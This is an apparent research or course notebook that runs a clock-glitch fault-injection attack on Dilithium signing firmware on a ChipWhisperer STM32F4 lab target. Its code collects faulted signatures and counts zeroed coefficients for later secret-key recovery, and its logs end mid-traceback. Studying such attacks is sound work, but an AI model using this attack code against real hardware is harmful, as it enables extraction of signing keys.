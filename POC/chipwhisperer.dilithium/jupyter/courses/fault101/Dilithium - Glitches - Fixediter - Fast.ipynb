{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Dilithium - Glitches - Fixediter  - Fast"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CW308_STM32F4'\n",
    "SS_VER = 'SS_VER_2_1'\n",
    "\n",
    "TIMEOUT_SIGN = 640\n",
    "ITER_TARGET = 63"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import logging\n",
    "logging.basicConfig(level=logging.NOTSET)\n",
    "logging.getLogger('io.github.alex1s.python-dilithium').setLevel(logging.WARNING)\n",
    "logging.getLogger('gurobipy.gurobipy').setLevel(logging.WARNING) # please be quiet gurobi\n",
    "logging.getLogger().setLevel(logging.DEBUG + 1) # default logger should not be used anyways!\n",
    "__LOGGER = logging.getLogger('sigglitches')\n",
    "__LOGGER.setLevel(logging.DEBUG)\n",
    "logging.getLogger(\"usb_ctrl\").setLevel(logging.WARNING)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "if '../../../software' not in sys.path:\n",
    "    sys.path.append('../../../software')\n",
    "if 'python-dilithium' not in sys.path:\n",
    "    sys.path.append('python-dilithium')\n",
    "if 'dilithium_solver' not in sys.path:\n",
    "    sys.path.append('dilithium_solver')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "logging.getLogger(\"ChipWhisperer NAEUSB\").debug(\"yahh\")\n",
    "import chipwhisperer as cw\n",
    "import importlib\n",
    "import json\n",
    "import uuid\n",
    "import numpy as np\n",
    "import ipywidgets as widgets\n",
    "from chipwhisperer.capture.targets import TargetIOError, TargetTimeoutError\n",
    "from dilithium import Dilithium\n",
    "import struct\n",
    "import random"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "d = Dilithium(2)\n",
    "d.pseudorandombytes_seed(b'attack-shuffling-countermeasure-keypair')\n",
    "pk, sk = d.keypair()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "make: Entering directory '/home/alexis/chipwhisperer.dilithium/hardware/victims/firmware/simpleserial-dilithium-ref'\n",
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      "make[1]: '.dep' is up to date.\n",
      "SS_VER set to SS_VER_2_1\n",
      ".\n",
      "Welcome to another exciting ChipWhisperer target build!!\n",
      "arm-none-eabi-gcc (15:9-2019-q4-0ubuntu1) 9.2.1 20191025 (release) [ARM/arm-9-branch revision 277599]\n",
      "Copyright (C) 2019 Free Software Foundation, Inc.\n",
      "This is free software; see the source for copying conditions.  There is NO\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n",
      "\n",
      ".\n",
      "Compiling:\n",
      "-en     simpleserial-dilithium-ref.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././simpleserial/simpleserial.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4_hal.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "In file included from .././hal/stm32f4/stm32f4_hal.c:3:\n",
      ".././hal/stm32f4/stm32f4_hal_lowlevel.h:108: warning: \"STM32F415xx\" redefined\n",
      "  108 | #define STM32F415xx\n",
      "      | \n",
      "<command-line>: note: this is the location of the previous definition\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4_hal_lowlevel.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "In file included from .././hal/stm32f4/stm32f4_hal_lowlevel.c:39:\n",
      ".././hal/stm32f4/stm32f4_hal_lowlevel.h:108: warning: \"STM32F415xx\" redefined\n",
      "  108 | #define STM32F415xx\n",
      "      | \n",
      "<command-line>: note: this is the location of the previous definition\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4_sysmem.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4xx_hal_rng.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Assembling: .././hal/stm32f4/stm32f4_startup.S\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CW308_STM32F4/stm32f4_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f4 -I.././hal/stm32f4/CMSIS -I.././hal/stm32f4/CMSIS/core -I.././hal/stm32f4/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f4/stm32f4_startup.S -o objdir-CW308_STM32F4/stm32f4_startup.o\n",
      ".\n",
      "LINKING:\n",
      "-en     simpleserial-dilithium-ref-CW308_STM32F4.elf ...\n",
      "-e Done!\n",
      ".\n",
      "Creating load file for Flash: simpleserial-dilithium-ref-CW308_STM32F4.hex\n",
      "arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-dilithium-ref-CW308_STM32F4.elf simpleserial-dilithium-ref-CW308_STM32F4.hex\n",
      ".\n",
      "Creating load file for Flash: simpleserial-dilithium-ref-CW308_STM32F4.bin\n",
      "arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-dilithium-ref-CW308_STM32F4.elf simpleserial-dilithium-ref-CW308_STM32F4.bin\n",
      ".\n",
      "Creating load file for EEPROM: simpleserial-dilithium-ref-CW308_STM32F4.eep\n",
      "arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\n",
      "--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-dilithium-ref-CW308_STM32F4.elf simpleserial-dilithium-ref-CW308_STM32F4.eep || exit 0\n",
      ".\n",
      "Creating Extended Listing: simpleserial-dilithium-ref-CW308_STM32F4.lss\n",
      "arm-none-eabi-objdump -h -S -z simpleserial-dilithium-ref-CW308_STM32F4.elf > simpleserial-dilithium-ref-CW308_STM32F4.lss\n",
      ".\n",
      "Creating Symbol Table: simpleserial-dilithium-ref-CW308_STM32F4.sym\n",
      "arm-none-eabi-nm -n simpleserial-dilithium-ref-CW308_STM32F4.elf > simpleserial-dilithium-ref-CW308_STM32F4.sym\n",
      "SS_VER set to SS_VER_2_1\n",
      "Size after:\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\n",
      "  15904\t   6540\t   4792\t  27236\t   6a64\tsimpleserial-dilithium-ref-CW308_STM32F4.elf\n",
      "+--------------------------------------------------------\n",
      "+ Default target does full rebuild each time.\n",
      "+ Specify buildtarget == allquick == to avoid full rebuild\n",
      "+--------------------------------------------------------\n",
      "+--------------------------------------------------------\n",
      "+ Built for platform CW308T: STM32F4 Target with:\n",
      "+ CRYPTO_TARGET = NONE\n",
      "+ CRYPTO_OPTIONS = NONE\n",
      "+--------------------------------------------------------\n",
      "make: Leaving directory '/home/alexis/chipwhisperer.dilithium/hardware/victims/firmware/simpleserial-dilithium-ref'\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "make -C ../../../hardware/victims/firmware/simpleserial-dilithium-ref"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer NAEUSB WARNING|File naeusb.py:717) Your firmware (0.60) is outdated - latest is 0.64 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO: Found ChipWhisperer😍\n"
     ]
    }
   ],
   "source": [
    "%run \"../../Setup_Scripts/Setup_Generic_Dilithium.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'|\\xb6~\\x00\\xd9.\\x0f\\x1b\\xc3\\xd1Z\\x0bX\\x16A#\\xb0\\x03!\\x0e\\x1a \\xc0P\\xc0\\x00d\\x00` \\x00\\x06\\x00\\x01\\x00\\x00\\x00\\x00\\x12\\x00\\x02\\x00\\x00@\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x0bb\\x07boot ok\\xc1\\x00'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fw_path = \"../../../hardware/victims/firmware/simpleserial-dilithium-ref/simpleserial-dilithium-ref-{}.hex\".format(PLATFORM)\n",
    "# cw.program_target(scope, prog, fw_path)\n",
    "target.dglitch_settings()\n",
    "target.reboot_flush()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Help on method signature_faulted in module dilithium:\n",
      "\n",
      "signature_faulted(message: bytes, secret_key: bytes, polyvec_index: int, poly_index: int) -> (<class 'bytes'>, <class 'int'>) method of dilithium.Dilithium instance\n",
      "\n"
     ]
    }
   ],
   "source": [
    "help(d.signature_faulted)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "d.signature_faulted(b'\\x01', sk, 0, 54)[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_message_without_rejections(poly_index: int = None) -> (bytes, bytes):\n",
    "    \"\"\"\n",
    "    Returns message, signature_packed\n",
    "    \"\"\"\n",
    "    if poly_index is None:\n",
    "        poly_index = 1000  # this index is out of range thus it will not fault\n",
    "    for i in range(2 ** 16 - 1):\n",
    "        upper = i // 256\n",
    "        lower = i % 256\n",
    "        message = bytes([upper, lower])\n",
    "        __LOGGER.debug(f'Checking whether message {message}, faulted at polyvec_index \"0\" and poly_index \"{poly_index}\",  will sign without rejections ...')\n",
    "        signature_packed, num_rejections = d.signature_faulted(message, sk, 0, poly_index)\n",
    "        if num_rejections != 0:\n",
    "            message = None\n",
    "            continue\n",
    "        else:\n",
    "            break\n",
    "    if message is None:\n",
    "        raise RuntimeException('We did not find a message without rejections searching two full bytes. While theoretically possible, it is more likely that the \"signature_faulted\" implementation is wrong.')\n",
    "    return message, signature_packed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:sigglitches:Checking whether message b'\\x00\\x00', faulted at polyvec_index \"0\" and poly_index \"1000\",  will sign without rejections ...\n",
      "DEBUG:sigglitches:Checking whether message b'\\x00\\x01', faulted at polyvec_index \"0\" and poly_index \"1000\",  will sign without rejections ...\n",
      "DEBUG:sigglitches:Message b'\\x00\\x01' signs without rejections!\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'ALL OK'"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# just some sanity checks ...\n",
    "message, signature_packed = get_message_without_rejections()\n",
    "__LOGGER.debug(f\"Message {message} signs without rejections!\")\n",
    "assert signature_packed is not None and num_rejections is not None\n",
    "target.sign(message, TIMEOUT_SIGN)  # the timeout ensures that our assumptions of zero rejectios is indeed true\n",
    "signature_packed_target = target.get_sig()\n",
    "assert signature_packed == signature_packed_target\n",
    "assert d.verify(signature_packed_target, message, pk)\n",
    "\"ALL OK\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "glitch_spots = [ITER_TARGET * 62 - 73]\n",
    "width_start = 6.640625\n",
    "width_stop = 6.640625\n",
    "offset_start = 6.640625\n",
    "offset_stop = 6.640625\n",
    "msg_start = 0\n",
    "msg_stop = 2 ** 16 -1\n",
    "repeat = 1\n",
    "step = 1\n",
    "redo = 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1.0 1.0 1\n",
      "0.0\n",
      "Expected sig time: 0.0s = 0.0min = 0.0h\n",
      "Expected sig + transfer time: 0.0s = 0.0min = 0.0h\n"
     ]
    }
   ],
   "source": [
    "width_width = (width_stop - width_start + 1) / step\n",
    "offset_width = (offset_stop - offset_start + 1) / step\n",
    "ext_offset_width = len(glitch_spots)\n",
    "print(width_width, offset_width, ext_offset_width)\n",
    "normal_time = width_width * offset_width * ext_offset_width * redo\n",
    "print(normal_time)\n",
    "t = TIMEOUT_SIGN * normal_time / 1000\n",
    "print(f'Expected sig time: {t}s = {t/60}min = {t/3600}h')\n",
    "t_all = t * 2.5 # what was that exactly again?\n",
    "print(f'Expected sig + transfer time: {t_all}s = {t_all/60}min = {t_all/3600}h')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4d64e15b88ce4b95bc0170a29859ba73",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ff68b5651ab0420d944adbdd3ed8a440",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='success count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "716ba7229c2f4dcbaa4baa3cb9fde60c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='reset count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fc570abb548442eb83c3114dc9a72e96",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='normal count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "17879ffd82fd487faf65c8bad2f47f2d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a6e46125b2414cabad37fdaa9ee714a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e52857e6961c4280a5caee665fceeb46",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='message setting:', disabled=True, max=10.0, reado…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "gc = glitch.GlitchController(groups=[\"perfect\", \"success\", \"somefault\", \"reset\", \"normal\"], parameters=[\"width\", \"offset\", \"message\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "#zero_widget = widgets.IntText(value=0, description=\"zeros (max)\", disabled=True)\n",
    "#zero_widget"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We need at least 512 zeros.\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "359e2b3f10dd4749ac1a7393649952e9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntSlider(value=0, description='zeros[0]', disabled=True, max=768)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75e62cc9ef94421fb62d1a0dcef5ddc0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntSlider(value=0, description='zeros[1]', disabled=True, max=768)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82b78891677940039a2f568a2c2aa796",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntSlider(value=0, description='zeros[2]', disabled=True, max=768)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a80af8d3029847bcba78b2f737b29d66",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntSlider(value=0, description='zeros[3]', disabled=True, max=768)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "MIN_ZEROS = d.n *  2 # double to account for false positive classifications; may still be too little for late glitches\n",
    "zeros = np.zeros(d.l)\n",
    "zero_widgets = list((widgets.IntSlider(\n",
    "    value=0,\n",
    "    min=0,\n",
    "    max=MIN_ZEROS + d.n, # most of the time we get a few more\n",
    "    step=1,\n",
    "    description=f\"zeros[{i}]\",\n",
    "    disabled=True,\n",
    "    continuous_update=True,\n",
    "    orientation='horizontal',\n",
    "    readout=True) for i in range(d.l)))\n",
    "print(f'We need at least {MIN_ZEROS} zeros.')\n",
    "display(*zero_widgets)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "sigs_faulted = []\n",
    "sigs_faulted_params = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\xf9\\xa4\\x0f\\x00:\\xf5M1\\xd0n[\\xb0\\x00\\xc0|\\x00A)\\x11^\\x17\\x00#\\x00\\x03\\x044\\x00\\x00`\\x91\\x10\\x00\\x00@\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x0bb\\x07boot ok\\xc1\\x00'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "gc.set_range(\"offset\", offset_start, offset_stop)\n",
    "gc.set_range(\"width\", width_start, width_stop)\n",
    "gc.set_range(\"message\", msg_start, msg_stop)\n",
    "gc.set_global_step(step)\n",
    "scope.glitch.repeat = repeat\n",
    "target.reboot_flush()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "def one_try(scope, target, gc, message_int, sigs_faulted: list, sigs_faulted_params: list) -> bool:\n",
    "    new_zeros = np.zeros(d.l)\n",
    "    param_tuple = (scope.glitch.width, scope.glitch.offset, message_int)\n",
    "    message = struct.pack('!H', message_int)\n",
    "    scope.arm()\n",
    "    try:\n",
    "        target.sign(message, TIMEOUT_SIGN)\n",
    "        \n",
    "        trigger_timeout = scope.capture()\n",
    "        if trigger_timeout:\n",
    "            gc.add(\"reset\", param_tuple)\n",
    "            __LOGGER.info('fail due to trigger timeout')\n",
    "            target.reboot_flush()\n",
    "            return new_zeros\n",
    "        \n",
    "    except TargetTimeoutError as e:\n",
    "        gc.add(\"reset\", param_tuple)\n",
    "        __LOGGER.info(f'failed due to read timeout: {e}')\n",
    "        target.reboot_flush()\n",
    "        return new_zeros\n",
    "    except TargetIOError as e:\n",
    "        gc.add(\"reset\", param_tuple)\n",
    "        __LOGGER.info(f'failed due to TargetIOError error: {e}')\n",
    "        target.reboot_flush()\n",
    "        return new_zeros\n",
    "    else:\n",
    "        try:\n",
    "            sig_candidate_packed = target.get_sig()\n",
    "            _, z_candidate, _ = d._unpack_sig(sig_candidate_packed)\n",
    "            \n",
    "            _, z_correct, _ = d._unpack_sig(d.signature(message, sk))\n",
    "            if np.all(z_candidate == z_correct):\n",
    "                gc.add(\"normal\", param_tuple)\n",
    "                return new_zeros\n",
    "            \n",
    "            max_num_zero = np.sum(np.abs(z_candidate) <= d.beta)\n",
    "            __LOGGER.info(f'We have at most faulted {max_num_zero} y coefficients to zero. (expected: {d.n - ITER_TARGET * d._polyz_unpack_coeffs_per_iter})')\n",
    "            min_num_nonzero = np.sum(np.abs(z_candidate) > d.beta)\n",
    "            min_num_zero_needed = d.n - ITER_TARGET * d._polyz_unpack_coeffs_per_iter\n",
    "            if max_num_zero >= min_num_zero_needed:\n",
    "                gc.add(\"perfect\", param_tuple)\n",
    "\n",
    "                # non trivial to estimate (at least for me, right now)\n",
    "                # gc.add(f\"perfect_{(min_num_nonzero - (d.l - 1) * d.n) // d._polyz_unpack_coeffs_per_iter}\", param_tuple)\n",
    "                new_zeros = np.sum(np.abs(z_candidate) <= d.beta, axis=1)\n",
    "            \n",
    "            gc.add(\"success\", param_tuple)\n",
    "            __LOGGER.info(\"Glitched! Ext offset: {} Offset: {} Width: {} Message:{}\".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width, message))\n",
    "            \n",
    "            sigs_faulted.append(sig_candidate_packed)\n",
    "            sigs_faulted_params.append(param_tuple)\n",
    "        except TargetIOError as e:\n",
    "            gc.add(\"reset\", param_tuple)\n",
    "            __LOGGER.info(f'Failed to read sig: {e}')\n",
    "            target.reboot_flush()\n",
    "    return new_zeros"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:arming scope\n",
      "ERROR:root:done arming scope\n",
      "ERROR:root:ARMING GLITCH\n",
      "ERROR:root:DONE ARMING GLITCH\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTargetTimeoutError\u001b[0m                        Traceback (most recent call last)",
